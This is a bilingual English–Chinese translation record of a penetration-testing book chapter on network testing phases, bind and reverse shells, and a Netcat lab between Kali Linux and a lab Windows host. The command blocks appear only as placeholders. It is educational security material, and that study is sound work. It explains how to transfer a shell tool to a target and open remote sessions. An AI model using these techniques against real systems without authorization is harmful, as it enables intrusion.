- en: 8 Understanding Network Penetration Testing
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 8 网络渗透测试理解
- en: Join our book community on Discord
  id: totrans-1
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 加入我们的书籍社区，参与 Discord 讨论
- en: '[https://packt.link/SecNet](https://packt.link/SecNet)![Qr code Description
    automatically generated](../media/file321.png)When breaking into the offensive
    side of cybersecurity, it’s essentials for aspiring ethical hackers and penetration
    testers to gain a solid understanding on the importance of network penetration
    testing and common techniques of setting up reverse and bind shells between a
    targeted system and their attacker machine. Furthermore, learning how to develop
    custom payloads and evade antimalware detection helps penetration testers to determine
    whether the cyber defense at a targeted organization has the capabilities of detecting
    malicious code over their network. In this chapter, you will learn about the importance
    of network penetration testing and how it helps organizations to identify hidden
    security vulnerabilities on their assets and to better understand how an adversary
    is able to compromise their systems. Furthermore, you’ll gain the hands-on experience
    on working with both bind and reverse shells between your attacker machine and
    a targeted system. In addition, you’ll learn how to develop and conceal malicious
    payloads to evade antimalware programs. Lastly, you’ll learn how to work with
    wireless network adapters and use them for monitoring wireless systems within
    the vincity. In this chapter, we will cover the following topics:'
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: '[https://packt.link/SecNet](https://packt.link/SecNet)![二维码 描述自动生成](../media/file321.png)当进入网络安全攻防领域时，对于有志成为道德黑客和渗透测试人员的人来说，掌握网络渗透测试的重要性以及设置反向和绑定
    Shell 的常见技巧至关重要。这些技巧帮助渗透测试人员与目标系统之间建立攻击机与被攻击系统的连接。此外，学习如何开发自定义负载并逃避反恶意软件检测，有助于渗透测试人员判断目标组织的网络防御是否具备检测恶意代码的能力。在本章中，您将了解网络渗透测试的重要性，以及它如何帮助组织识别其资产中的隐藏安全漏洞，进一步理解攻击者是如何攻破系统的。此外，您将获得使用绑定和反向
    Shell 的实操经验，并学习如何开发和隐匿恶意负载，以规避反恶意软件程序的检测。最后，您还将学习如何使用无线网络适配器，并利用它们监控周边无线系统。在本章中，我们将涵盖以下主题：'
- en: Introduction to network penetration testing
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 网络渗透测试介绍
- en: Working with bind and reverse shells
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用绑定和反向 Shell
- en: Antimalware evasion techniques
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 反恶意软件逃避技巧
- en: Working with wireless adapters
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用无线适配器
- en: Managing and monitoring wireless modes
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 管理和监控无线模式
- en: Let’s dive in!
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们开始吧！
- en: Technical Requirements
  id: totrans-9
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'To follow along with the exercises in this chapter, please ensure that you
    have met the following hardware and software requirements:'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 为了跟随本章的练习，请确保您已满足以下硬件和软件要求：
- en: Kali Linux - [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Kali Linux - [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)
- en: Shelter - [https://www.shellterproject.com/introducing-shellter/](https://www.shellterproject.com/introducing-shellter/)
  id: totrans-12
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Shelter - [https://www.shellterproject.com/introducing-shellter/](https://www.shellterproject.com/introducing-shellter/)
- en: Alfa AWUS036NHA Wireless B/G/N USB adapter
  id: totrans-13
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Alfa AWUS036NHA 无线 B/G/N USB 适配器
- en: Alfa AWUS036ACH Long-Range Dual-Band AC1200 Wireless USB 3.0 Wi-Fi adapter
  id: totrans-14
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Alfa AWUS036ACH 长程双频 AC1200 无线 USB 3.0 Wi-Fi 适配器
- en: Not all wireless network adapters support monitoring mode and packet injection.
    Sometimes, a vendor makes a minor revision to a chipset version on their product
    which prevents the wireless network adapter from operating in monitoring mode
    on the penetration tester’s machine. In addition, some wireless network adapters
    may not work out-of-the-box and require you to download and compiled the drivers
    on your Kali Linux machine.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 并非所有无线网络适配器都支持监控模式和数据包注入。有时，厂商会对其产品的芯片版本做小的修改，从而导致无线网络适配器无法在渗透测试人员的机器上以监控模式运行。此外，某些无线网络适配器可能无法开箱即用，您需要下载并在
    Kali Linux 机器上编译驱动程序。
- en: Introduction to network penetration testing
  id: totrans-16
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 网络渗透测试介绍
- en: 'Network penetration testing is the systematic approach and techniques used
    by ethical hackers and penetration testers to simulate a real-world cyber-attack
    on a targeted organization, its systems and networks, with the intention of discovering
    hidden security vulnerabilities and providing recommendations for implementing
    countermeasures and security controls to mitigate and prevent a real adversary
    from compromising the organization and its assets. During the technical phases
    of network penetration testing, the ethical hacker or penetration tester uses
    similar **Tactics, Techniques and Procedures** (**TTPs**) as a real adversary
    to test the cyber defensives, monitoring and prevention techniques of the organization’s
    security team, and to identify security flaws on targeted systems. Based on the
    finding during the technical phases of the penetration test, the information collected
    can be leverage to better understand how a real attacker will discover security
    flaws, the method of attack, possible tools and infrastructure used to setup the
    attack and deliver a payload to the target, and the potential impact of a real
    attack were to occur on the organization’s systems and network. Such information
    is commonly referred to **Cyber Threat Intelligence** (**CTI**). This data is
    used by the penetration tester to provide insights to stakeholders on their cyber
    risk, types of security vulnerabilities and their severity ratings, and what can
    be done to resolve the security vulnerabilities while improving the organization’s
    security posture.The following are typical phases of network penetration testing:'
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 网络渗透测试是由道德黑客和渗透测试员采用的系统性方法和技术，用以模拟对目标组织及其系统和网络的真实网络攻击，目的是发现潜在的安全漏洞，并提供实施对策和安全控制措施的建议，以减轻和防止真实对手对组织及其资产的入侵。在网络渗透测试的技术阶段，道德黑客或渗透测试员使用与真实对手相似的**战术、技术和程序**（**TTPs**）来测试组织安全团队的网络防御、监控和预防技术，并识别目标系统的安全缺陷。根据渗透测试技术阶段的发现，收集到的信息可以帮助更好地理解真实攻击者如何发现安全缺陷、攻击方法、可能使用的工具和基础设施来设置攻击并向目标投递有效载荷，以及如果发生真实攻击时对组织的系统和网络可能造成的影响。这类信息通常被称为**网络威胁情报**（**CTI**）。渗透测试员利用这些数据为利益相关者提供有关网络风险、安全漏洞类型及其严重性评级的洞察，并帮助组织解决安全漏洞，同时提升其安全防御能力。以下是网络渗透测试的典型阶段：
- en: Define the scope – The scope provides a clear understanding of which systems
    and networks are to be tested and whether specific tools or techniques are restricted.
  id: totrans-18
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 确定范围 – 范围提供了对需要测试的系统和网络的明确理解，以及是否限制使用特定工具或技术。
- en: Performing reconnaissance – This is the information gathering phase where the
    penetration tester performs both passive and active reconnaissance on the target.
  id: totrans-19
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 执行侦察 – 这是信息收集阶段，渗透测试员在目标上执行被动和主动侦察。
- en: Scanning and enumeration – The scanning and enumeration phase is commonly used
    to collect specific details information about the target such as open ports, running
    services, operating system, identify user accounts, network shares and configurations
    on targeted systems.
  id: totrans-20
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 扫描与枚举 – 扫描和枚举阶段通常用于收集有关目标的具体详细信息，如开放端口、运行服务、操作系统、识别用户账户、网络共享和目标系统的配置。
- en: Vulnerability analysis – During this phase, the penetration tester analyzes
    the collected data from the previous phases to identify any potential security
    vulnerabilities on the target, determine their severity and risk rating, and countermeasures
    to help the organization improve their cyber defensives.
  id: totrans-21
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 漏洞分析 – 在这一阶段，渗透测试员分析前几个阶段收集到的数据，以识别目标上的潜在安全漏洞，评估漏洞的严重性和风险评级，并提出对策帮助组织改善其网络防御。
- en: Exploitation – In this phase, the ethical hacker or penetration tester attempts
    to exploit each security vulnerability found on a targeted system using both manual
    and automated techniques to determine whether the security vulnerability actual
    exists and gain a foothold on the target.
  id: totrans-22
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 利用漏洞 – 在这一阶段，道德黑客或渗透测试员尝试利用目标系统上发现的每个安全漏洞，使用手动和自动化技术来验证安全漏洞的存在，并获取目标系统的控制。
- en: Post-exploitation – Once a targeted system is compromised, the penetration tester
    will attempt to expand their foothold further into the compromised system and
    onto other systems within scope. During this phase, the penetration tester can
    identify additional security vulnerabilities on the target.
  id: totrans-23
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 利用后阶段 – 一旦目标系统被攻破，渗透测试人员将尝试进一步扩展他们在受侵系统中的立足点，并渗透到范围内的其他系统。在这个阶段，渗透测试人员可以识别目标系统上的其他安全漏洞。
- en: Reporting – This reporting is one of the most important phases during any penetration
    test. The penetration tester is required to provide a detailed technical and executive
    report to the stakeholders of the targeted organization with information about
    the security assessment, the techniques used to discover the security vulnerabilities,
    the security vulnerabilities that were found and recommendations on how to improve
    the security posture of the targeted system.
  id: totrans-24
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 报告 – 报告是任何渗透测试过程中最重要的阶段之一。渗透测试人员需要向目标组织的利益相关者提供一份详细的技术报告和执行报告，报告内容包括安全评估、用于发现安全漏洞的技术、发现的安全漏洞以及如何改进目标系统安全态势的建议。
- en: Remediation – Based on the information in the report, the organization can implement
    the necessary steps needed to remediate the identified security vulnerabilities
    on the targeted system. The process may involve applying security controls, patches,
    and improving the configuration on systems and devices.
  id: totrans-25
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 修复 – 基于报告中的信息，组织可以实施必要的步骤，修复目标系统中已识别的安全漏洞。这个过程可能包括应用安全控制、打补丁以及改善系统和设备的配置。
- en: Network penetration testing provides a lot of advantages for organizations,
    such as helping companies stay ahead of cyber criminals by proactively identifying
    security vulnerabilities on their assets, while determining how a real attacker
    will be able to compromise targeted systems and using the insights to improve
    and harden their systems and network infrastructure. Furthermore, vulnerability
    analysis helps organizations to better prioritize their resources into implementing
    remediation such as countermeasures to address most critical security vulnerabilities
    first. For instance, a system with a security vulnerability risk rating of 8 should
    be prioritized over a system with a lower severity rating such as 3\. However,
    it's important to consider whether each of these systems are connected directly
    to the internet or on an internal network. While some professionals may argue
    that the severity risk rating should take precedence, it’s important to note that
    a critical system that’s directly connected to the internet with a lower severity
    rating may be prioritized because an external threat actor has direct connectivity
    to the system as compared to an internal system.Each day, many organizations are
    reporting data breaches. Network penetration testing helps organizations take
    a proactive approach in identifying and resolving security vulnerabilities, therefore
    reducing the risk of a real cyber-attack in the future. In addition, this helps
    organizations thoroughly assess their cyber defensives and determine whether their
    systems networks and infrastructure is compliant with various industry standards
    and frameworks. For instance, organizations that process a payment card system
    are required to be **Payment Card Industry Data Security Standard** (**PCI DSS**)
    compliant to provide sensitive data during a payment transaction. While many organizations
    are continuously working on improving their cybersecurity strategies, performing
    network penetration testing helps the organization to measure their incident response
    and handling preparedness of their security team. If organizations are unable
    to efficiently identify and respond to security incidents, the threat actor will
    be able to expand their foothold on the compromised network and potentially cause
    more damages to the organization. Another important benefit of performing regular
    security assessments is helping organizations stay ahead of new and emerging threats
    in the wild. While many organizations have a patch management system, network
    penetration testing helps organizations to determine whether there are any inefficiencies
    in the patch management process and if there are any security vulnerabilities
    on their systems which can be exploited by a cyber-criminal.Over the next few
    sections, you will learn about the importance of bind and reverse shells, and
    how they can be leveraged by ethical hackers and penetration testers.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 网络渗透测试为组织提供了许多优势，例如通过主动识别资产上的安全漏洞，帮助公司保持在网络犯罪分子之前，同时确定真实攻击者如何能够入侵目标系统，并利用这些洞察力来改善和强化其系统和网络基础设施。此外，漏洞分析帮助组织更好地优先分配资源，实施补救措施，如优先解决最关键的安全漏洞。例如，具有安全漏洞风险评分为8的系统应优先于风险评分较低（如3）的系统。然而，重要的是要考虑这些系统是否直接连接到互联网或在内部网络中。虽然一些专业人士可能认为风险评分的严重性应优先考虑，但需要注意的是，直接连接到互联网且风险评分较低的关键系统可能会被优先考虑，因为外部威胁行为者可以直接访问该系统，而不是内联网中的系统。每天，许多组织都在报告数据泄露事件。网络渗透测试帮助组织采取主动方法，识别和解决安全漏洞，从而减少未来真实网络攻击的风险。此外，这还帮助组织全面评估其网络防御，并确定其系统、网络和基础设施是否符合各种行业标准和框架。例如，处理支付卡系统的组织必须符合**支付卡行业数据安全标准**
    (**PCI DSS**)，才能在支付交易中提供敏感数据。尽管许多组织持续改进其网络安全策略，但进行网络渗透测试有助于组织评估其安全团队的事件响应和处理准备情况。如果组织无法有效识别和应对安全事件，威胁行为者将能够在被攻破的网络中扩大立足点，并可能对组织造成更多损害。定期进行安全评估的另一个重要好处是帮助组织领先于新兴的威胁。尽管许多组织拥有补丁管理系统，网络渗透测试帮助组织判断补丁管理流程是否存在任何低效之处，以及系统中是否存在可以被网络犯罪分子利用的安全漏洞。在接下来的几个章节中，你将了解bind和reverse
    shell的重要性，以及它们如何被道德黑客和渗透测试员利用。
- en: Working with bind and reverse shells
  id: totrans-27
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用bind和reverse shell
- en: '**Bind shells** are commonly used by penetration testers to logically bind
    a service port on a targeted system to await an incoming connection, this is commonly
    referred to as a *listener*. For instance, imagine your target is a vulnerable
    server on the internet with a public IP address, while your attacker machine such
    as Kali Linux is behind a router or firewall with **Network Address Translation**
    (**NAT**) enabled. Furthermore, if there’s a firewall between the source and destination,
    firewalls are usually configured to allow outbound traffic from their internal
    network to the internet, but not vice versa. Therefore, if a device on the internet
    initiates a connection to a system on a private network, the NAT-enabled router
    or firewall will automatically terminate (close/block) the connection for security
    reasons.'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: '**绑定Shell**通常由渗透测试人员使用，用于在目标系统上逻辑性地绑定一个服务端口，以等待传入连接，这通常被称为*监听器*。例如，假设你的目标是一个具有公共IP地址的互联网脆弱服务器，而你的攻击者机器（如Kali
    Linux）位于一个启用了**网络地址转换**（**NAT**）的路由器或防火墙后面。此外，如果源和目标之间存在防火墙，防火墙通常会配置为允许从内部网络到互联网的出站流量，但不允许反向流量。因此，如果互联网设备向私有网络上的系统发起连接，启用了NAT的路由器或防火墙会因安全原因自动终止（关闭/阻止）该连接。'
- en: On a NAT-enabled router, the private source IPv4 address is translation into
    the public IPv4 address on the internet-facing interface on the router before
    it’s sent on the internet. This means, internet-connection devices will see the
    sender’s address as the public IPv4 address on the router or modem, and not the
    private IPv4 address of the client on the private network. NAT prevent direct
    connections between source and destination devices.
  id: totrans-29
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 在启用了NAT的路由器上，私有源IPv4地址会在路由器的面向互联网的接口上被转换为公共IPv4地址，然后发送到互联网。这意味着，互联网连接设备将看到发送方的地址为路由器或调制解调器上的公共IPv4地址，而不是私有网络中客户端的私有IPv4地址。NAT防止源和目标设备之间的直接连接。
- en: 'The following are common attributes of bind shell for penetration testers:'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是渗透测试人员常见的绑定Shell属性：
- en: Bind shells are shells which are bind to a specific port to create a listener
    for incoming connections from a remote machine.
  id: totrans-31
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 绑定Shell是绑定到特定端口的Shell，用于创建一个监听器，以接受来自远程机器的传入连接。
- en: When a remote machine established a connection to the targeted system that is
    running the listener on the specific bind port, a shell is spawned between the
    remote machine and the targeted system. Therefore, providing remote access to
    the targeted system.
  id: totrans-32
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 当远程机器与运行监听器并监听特定绑定端口的目标系统建立连接时，会在远程机器和目标系统之间创建一个Shell。因此，提供了远程访问目标系统的方式。
- en: Bind shells are commonly used by penetration testers when the IP address of
    the targeted system is known and a listener can be configured on it.
  id: totrans-33
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 绑定Shell通常由渗透测试人员使用，当目标系统的IP地址已知并且可以在其上配置监听器时。
- en: 'If a penetration tester is able to compromise a vulnerable system on the internet,
    a listener can be bound to the Windows Command Prompt or a Linux shell with the
    targeted system’s IP address and bind port number. This enables the penetration
    tester to remote connect to the targeted system via its public IP address and
    bind port number, and obtain a bind shell on the target.The following diagram
    shows a visual representation of a bind shell between an attacker’s machine and
    a targeted system:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 如果渗透测试人员能够突破互联网上的一个脆弱系统，则可以将监听器绑定到Windows命令提示符或Linux Shell，并指定目标系统的IP地址和绑定端口号。这使得渗透测试人员能够通过目标的公共IP地址和绑定端口号远程连接到目标系统，并在目标系统上获取绑定Shell。下图展示了攻击者的机器与目标系统之间的绑定Shell的可视化表示：
- en: '![](../media/file322.png)'
  id: totrans-35
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file322.png)'
- en: 'As shown in the preceding diagram, the attacker machine such as Kali Linux
    is located on a private network and it’s behind a firewall that’s configured to
    performing outbound traffic to the internet. However, the penetration tester wants
    to establish a remote shell to the targeted system on the internet. Therefore,
    the penetration tester needs to compromise the targeted system and setup a listener
    on the public IP address and a port number on the target.The penetration tester
    can use Netcat, Ncat and even Metasploit to setup bind shells between a target
    and attacker machines. These are common tools within the cybersecurity industry
    that’s great for binding an IP address and port number for listeners. Keep in
    mind, once a shell is established between system, the penetration tester will
    be able to remote execute commands on the targeted system over a network.**Reverse
    shell** is another technique commonly used by penetration testers to setup a call-back
    session from a compromised system to the attacker machine. Unlike bind shells,
    penetration testers set up a listener on their attacker machine, then sends instructions
    to the targeted system to establish a call-back session to the listener. For instance,
    imagine you’ve compromised a targeted system on an internal network and you have
    another attacker machine that’s running on a cloud with a public IP address. If
    you attempt to establish a connection between the attacker machine that’s hosted
    on the cloud to the targeted system on a private network, the targeted organization’s
    router or firewall will automatically terminate the session.Using a reverse shell,
    the penetration tester can configure the listener on the attacker machine on the
    cloud and send instructions to the targeted machine to establish a connection
    the listener server, as shown in the following diagram:'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 如前图所示，攻击者机器（例如 Kali Linux）位于私有网络中，并且它在一个配置了允许出站流量访问互联网的防火墙后面。然而，渗透测试员希望在互联网上的目标系统上建立一个远程
    shell。因此，渗透测试员需要攻破目标系统，并在目标的公共 IP 地址和端口号上设置监听器。渗透测试员可以使用 Netcat、Ncat 甚至 Metasploit
    在目标与攻击者机器之间设置绑定 shell。这些是网络安全行业中常见的工具，适用于为监听器绑定 IP 地址和端口号。请记住，一旦系统之间建立了 shell，渗透测试员就能够通过网络在目标系统上远程执行命令。**反向
    shell**是渗透测试员常用的另一种技术，用于从被攻破的系统到攻击者机器设置回调会话。与绑定 shell 不同，渗透测试员在其攻击者机器上设置监听器，然后发送指令到目标系统，以建立回调会话。例如，假设您已经攻破了一个位于内部网络上的目标系统，而另一个攻击者机器在云端运行并具有公共
    IP 地址。如果您尝试在云端的攻击者机器与私有网络上的目标系统之间建立连接，目标组织的路由器或防火墙将自动终止会话。通过使用反向 shell，渗透测试员可以在云端的攻击者机器上配置监听器，并向目标机器发送指令，建立与监听服务器的连接，如下图所示：
- en: '![](../media/file323.png)'
  id: totrans-37
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file323.png)'
- en: 'The following are common attributes of bind shell for penetration testers:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是渗透测试员常用的绑定 shell 的常见属性：
- en: Penetration testers setup a listener on the attacker machine and sends instructions
    to the targeted system to establish a call-back session.
  id: totrans-39
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 渗透测试员在攻击者机器上设置监听器，并向目标系统发送指令，建立回调会话。
- en: When the targeted system establish a session to the listener on the attacker
    machine, a shell is spawned which enables the penetration tester to remotely execute
    commands on the target.
  id: totrans-40
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 当目标系统与攻击者机器上的监听器建立会话时，会生成一个 shell，渗透测试员可以在目标上远程执行命令。
- en: Reverse shells are commonly used when the penetration tester does not have direct
    access to the targeted machine that’s behind a NAT-enable router or firewall.
    Therefore, it’s less complex for the compromised system to establish an outbound
    connection to the internet.
  id: totrans-41
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 反向 shell 常用于渗透测试员无法直接访问目标机器的情况，特别是当目标机器位于启用了 NAT 的路由器或防火墙后面时。因此，对于被攻破的系统来说，建立与互联网的出站连接相对简单。
- en: In the next few sub-sections, you will learn how to create both bind and reverse
    shells using various tools.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 在接下来的几个子章节中，您将学习如何使用各种工具创建绑定和反向 shell。
- en: Remote shells using Netcat
  id: totrans-43
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用 Netcat 进行远程 shell
- en: 'In this exercise, you will learn the fundamentals of working with remote shells
    using Netcat. Netcat is a multi-purpose toll that enables IT professionals to
    create a network connection between multiple systems using **Transmission Control
    Protocol/Internet Protocol** (**TCP/IP**). In addition, you will learn how to
    setup a listener to capture incoming connection from a remote device over a network.Before
    proceeding further, please ensure you use the following guidelines:'
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 在本练习中，你将学习使用 Netcat 进行远程 Shell 操作的基本知识。Netcat 是一款多用途工具，使 IT 专业人员能够通过**传输控制协议/互联网协议**（**TCP/IP**）在多个系统之间建立网络连接。此外，你还将学习如何设置监听器，以捕获来自远程设备通过网络传入的连接。在继续之前，请确保遵循以下指南：
- en: Kali Linux is the attacker machine with a network adapter connected on `192.168.42.0/24`
    (RedTeamLab) network.
  id: totrans-45
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Kali Linux 是攻击者机器，网络适配器连接在`192.168.42.0/24`（RedTeamLab）网络上。
- en: Bob-PC will operate as the targeted host which is also connected to the `192.168.42.0/24`
    (RedTeamLab) network.
  id: totrans-46
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Bob-PC 将作为目标主机运行，且也连接到`192.168.42.0/24`（RedTeamLab）网络。
- en: Use the local administrator account to login to Bob-PC. Please see *Chapter
    3 - Setting up for Advanced Penetration Testing Techniques* for the user credentials.
  id: totrans-47
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用本地管理员账户登录 Bob-PC。有关用户凭证，请参阅*第3章 - 高级渗透测试技巧设置*。
- en: Kali Linux will run Netcat as a listener to capture any incoming connections,
    while Bob-PC will be used to establish the Netcat session to Kali Linux.
  id: totrans-48
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Kali Linux 将运行 Netcat 作为监听器，捕获任何传入的连接，而 Bob-PC 将用于建立到 Kali Linux 的 Netcat 会话。
- en: 'To get started on remote shells using Netcat, please use the following instructions:'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 要开始使用 Netcat 进行远程 Shell 操作，请按照以下指示进行操作：
- en: 'Power-on the **Kali Linux** virtual machine, open the **Terminal** and use
    the `ip address` or `ifconfig` command to identify which interface is connected
    to the `192.168.42.0/24` network and it’s host address, as shown below:'
  id: totrans-50
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 启动**Kali Linux**虚拟机，打开**终端**，并使用`ip address`或`ifconfig`命令来识别哪个接口连接到`192.168.42.0/24`网络，以及它的主机地址，如下所示：
- en: '![](../media/file324.png)'
  id: totrans-51
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file324.png)'
- en: As shown in the preceding screenshot, Kali Linux has the `192.168.42.27` address
    on its `eth2` interface that’s connected to the `192.168.42.0/24` network.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，Kali Linux 在其`eth2`接口上有一个`192.168.42.27`地址，且连接到`192.168.42.0/24`网络。
- en: 'Within Kali Linux, there are set of pre-loaded Windows binary files which are
    useful to ethical hackers and penetration testers. One of these Windows-based
    binaries is **Netcat** for Windows. Let’s setup a Python-based web server on our
    Kali Linux virtual machine to transfer the Netcat file to the targeted system.
    On **Kali Linux**, use the following commands to setup a web server within the
    Windows binaries directory:'
  id: totrans-53
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 Kali Linux 中，有一组预加载的 Windows 二进制文件，这些文件对道德黑客和渗透测试人员非常有用。这些 Windows 二进制文件之一就是适用于
    Windows 的**Netcat**。让我们在 Kali Linux 虚拟机上设置一个基于 Python 的 Web 服务器，将 Netcat 文件传输到目标系统。请在**Kali
    Linux**中使用以下命令，在 Windows 二进制文件目录下设置 Web 服务器：
- en: '[PRE0]'
  id: totrans-54
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Once the Python web server is running within `/usr/share/windows-binaries` directory,
    any user that connects to Kali Linux on port `8080` will be able to view and download
    files from the directory.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦 Python 网络服务器在`/usr/share/windows-binaries`目录下运行，任何连接到 Kali Linux 的用户都能够查看并下载该目录中的文件。
- en: 'Next, power-on **Bob-PC** virtual machine and login with the local administrator
    account. On the logon screen, click on **Other User**, enter username: `Bob-PC\bob`
    and password: `P@ssword2` as shown in the following screenshot:'
  id: totrans-56
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，开启**Bob-PC**虚拟机并使用本地管理员账户登录。在登录屏幕上，点击**其他用户**，输入用户名：`Bob-PC\bob`和密码：`P@ssword2`，如以下截图所示：
- en: '![](../media/file325.png)'
  id: totrans-57
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file325.png)'
- en: 'On **Bob-PC**, open the web browser and connect to `http://<Kali-Linux-address>:8080`
    and download the **nc.exe** file, as shown below:'
  id: totrans-58
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**Bob-PC**上，打开网页浏览器，连接到`http://<Kali-Linux-address>:8080`并下载**nc.exe**文件，如下所示：
- en: '![](../media/file326.png)'
  id: totrans-59
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file326.png)'
- en: After downloading the **nc.exe** file, copy/move it to the `C:\Windows\System32`
    directory within **Bob-PC**. After the downloading the file, you can quit the
    Python web server by pressing `CTRL + Z` on the keyboard.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 下载完**nc.exe**文件后，将其复制/移动到**Bob-PC**中的`C:\Windows\System32`目录。下载文件后，可以通过按下键盘上的`CTRL
    + Z`退出 Python 网络服务器。
- en: 'Next, to setup a Netcat listener on port `1234`, use the following commands
    on **Kali Linux**:'
  id: totrans-61
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，要在端口`1234`上设置一个 Netcat 监听器，请在**Kali Linux**上使用以下命令：
- en: '[PRE1]'
  id: totrans-62
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'The following is a breakdown of the preceding commands:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是前述命令的详细解析：
- en: '`-n`: Specifies to use the IP address only and do not perform Domain Name System
    (DNS) queries.'
  id: totrans-64
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-n`：指定仅使用 IP 地址，不执行域名系统（DNS）查询。'
- en: '`-l`: Specifies to listen for incoming connections.'
  id: totrans-65
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-l`：指定监听传入连接。'
- en: '`-v`: Specifies to use verbose mode.'
  id: totrans-66
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-v`：指定使用详细模式。'
- en: '`-p`: Specific the listening port number'
  id: totrans-67
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`-p`：指定监听端口号。'
- en: 'Next, on **Bob-PC**, open the **Command Prompt** and use the following commands
    to establish a Netcat connection to Kali Linux:'
  id: totrans-68
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，在 **Bob-PC** 上，打开 **命令提示符** 并使用以下命令建立到 Kali Linux 的 Netcat 连接：
- en: '[PRE2]'
  id: totrans-69
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'Once the session is established from **Bob-PC** (client) to **Kali Linux**
    (listener/server), you can enter messages on either systems and it will be sent
    over to the other end, as shown here:'
  id: totrans-70
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦从 **Bob-PC**（客户端）到 **Kali Linux**（监听器/服务器）建立会话，你可以在任一系统上输入消息，消息会发送到另一端，如下所示：
- en: '![](../media/file327.png)'
  id: totrans-71
  prefs: []
  type: TYPE_IMG
  zh: '![](../media/file327.png)'
- en: As shown in the preceding screenshot, messages were entered on Bob-PC and were
    received on the Netcat listener on Kali Linux.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 如上图所示，消息在 Bob-PC 上输入并在 Kali Linux 上的 Netcat 监听器中接收到。
- en: To terminate the session, use `CTRL + Z` key combinations on the keyboard
  id: totrans-73
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要终止会话，请使用键盘上的 `CTRL + Z` 键组合。
- en: In this exercise, you’ve learnt how to establish a remote shell between two
    host machines and establish a communication channel. While this is a basic technique,
    it provides some practical insights into how remote shells operate between hosts
    on a network. Next, you will learn how to establish a bind shell using Netcat.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
